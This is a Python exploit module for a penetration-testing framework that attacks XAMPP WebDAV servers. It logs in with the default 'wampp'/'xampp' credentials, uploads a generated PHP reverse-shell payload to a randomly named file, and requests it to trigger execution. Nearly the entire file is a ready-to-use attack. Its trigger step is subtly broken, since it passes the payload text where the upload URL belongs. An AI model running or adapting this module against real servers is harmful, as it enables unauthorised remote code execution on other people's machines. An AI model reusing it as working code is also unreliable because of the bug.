# -*- coding: utf-8 -*-

"""
Exploit: XAMPP WebDav Upload PHP
Documentation: N/A
"""

# Library
from lib.utils.printer import (
    print_status,
    print_error
)

# Framework
from framework.modules.util import register_option
from framework.console.opt import Option
from framework.client.http.http_client import http_request
from framework.modules.metadata import (
    Module,
    Arch,
    Platform
)
from framework.modules.exploit import (
    Exploit,
    Target
)


class TerasploitModule(Exploit):

    def __init__(self):
        self.info = dict(
            Name="XAMPP WebDav Upload PHP",
            License="BSD-3-Clause License",
            Module=Module.EXPLOIT,
            Arch=Arch.PHP,
            Platform=Platform.WINDOWS,
            Author=[
                "charlie <castilloncharlie.a[a]gmail.com>"
            ],
            Description=[
                "Takes advantage of weak webdav xampp passwords,",
                "it uses the supplied credentials to exploit the",
                "target and upload a shell."
            ],
            Reference=[
                "https://github.com/blu0/webdav-exploit",
                "metasploit (windows/http/xampp_webdav_upload_php)"
            ],
            DefaultPayload="php/windows/reverse_php",
            DefaultOptions=["RHOST", "RPORT", "PROXY", "SSL"],
            Target={
                "0": "Automatic"
            },
        )

        register_option([
            Option("USERNAME", "yes", "username for authentication", "wampp"),
            Option("PASSWORD", "yes", "password for authentication", "xampp"),
            Option("PATH", "yes", "url path to attempt the upload", "/webdav/")
        ])

    def exploit(self) -> None | str:

        shell = self.generate_payload()["payload"]
        random_string = self.generate_random_string()

        # The shell url
        shell_url = (
            f"{Target.scheme}://"
            f"{Target.hostname}"
            f"{Target.path}{random_string}.php"
        )

        try:
            exploit_target = http_request(
                "put",
                url=shell_url,
                data=shell,
                auth=self.http_digest_auth(),
                proxies=self.opt("PROXY"),
                verify=self.opt("SSL")
            )

            # Check the status of the exploit
            if exploit_target.status_code in self.good_status_code:
                print_status(f"Shell uploaded: {shell}")

                # Attempt to execute the payload
                print_status("Attempting to execute payload...")

                # Execute the payload via http get request on shell url
                http_request(
                    "get",
                    url=shell,
                    timeout=20
                )
                return None

            # Exploit failed if the status code is not good
            else:
                print_status(
                    "Exploit failed,",
                    f"status code: {exploit_target.status_code}"
                )
                return "failed"

        except Exception as e:
            print_error(e)
            return "exception"
